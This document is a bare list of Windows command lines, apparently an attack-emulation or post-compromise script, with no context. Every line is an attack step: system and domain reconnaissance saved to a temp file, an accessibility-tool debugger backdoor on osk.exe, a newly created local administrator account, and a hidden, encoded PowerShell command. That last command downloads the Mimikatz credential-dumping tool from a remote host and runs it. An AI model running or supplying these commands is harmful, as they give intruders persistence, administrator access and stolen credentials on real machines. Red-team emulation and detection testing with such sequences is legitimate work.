cmd.exe /c "whoami"

cmd.exe /c "ping -n 1 8.8.8.8"

cmd.exe /c "netstat -rn >> C:\Users\Demo\AppData\Local\Temp\a.txt"

cmd.exe /c "systeminfo >> C:\Users\Demo\AppData\Local\Temp\a.txt"

cmd.exe /c "net group "Domain Admins" /domain >> C:\Users\Demo\AppData\Local\Temp\a.txt"

cmd.exe /c "reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v "Debugger" /t REG_SZ /d "cmd.exe" /f"

cmd.exe /c "net user rickflair natureb0y /add"

cmd.exe /c "net localgroup Administrators rickflair /add"

cmd.exe /c "tracert -d systemlowcheck.com"

cmd.exe /c "powershell -windowStyle Hidden -ExecutionPolicy Bypass -encodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AYwBsAHkAbQBiADMAcgAvAFAAbwB3AGUAcgBTAGgAZQBsAGwALwBtAGEAcwB0AGUAcgAvAEkAbgB2AG8AawBlAC0ATQBpAG0AaQBrAGEAdAB6AC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAnACkAOwAgAEkAbgB2AG8AawBlAC0ATQBpAG0AaQBrAGEAdAB6AA=="
